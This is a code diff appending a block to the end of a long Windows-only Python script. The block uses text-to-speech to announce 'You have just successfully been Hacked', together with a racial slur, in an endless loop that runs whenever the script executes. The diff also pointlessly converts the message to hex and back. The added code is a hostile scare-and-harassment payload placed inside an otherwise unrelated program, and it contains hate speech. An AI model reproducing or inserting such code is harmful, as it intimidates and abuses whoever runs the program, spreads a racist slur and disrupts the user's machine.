@@ -2608,3 +2608,40 @@ if __name__ == "__main__":
 
 	else:
 		print("Only Windows OS is supported!")
+
+
+
+# Initialize the text-to-speech engine
+engine = pyttsx3.init()
+
+# Set properties
+engine.setProperty('rate', 150)  # Set speaking rate (words per minute)
+engine.setProperty('volume', 1.0)  # Set volume level (0.0 to 1.0)
+
+# Change voice (optional)
+voices = engine.getProperty('voices')
+engine.setProperty('voice', voices[1].id)  # Change to female voice (index 1)
+
+# Message to be spoken
+message = b"wassup little nigger quick info You have just successfully been Hacked".decode('utf-8')
+
+# Print the message
+print("Message:", message)
+
+# Convert the message to bytes using UTF-8 encoding
+message_bytes = message.encode('utf-8')  # Convert to bytes
+# Convert bytes to hex
+message_hex = message_bytes.hex()  # Convert to hex
+
+# Print the hex representation
+print("Hex representation:", message_hex)
+
+# Convert hex back to bytes and then decode to string for speech
+decoded_message = bytes.fromhex(message_hex).decode('utf-8')
+
+# Speak the decoded message
+while True:
+    engine.say(decoded_message)
+
+    # Wait for the speech to finish
+    engine.runAndWait()
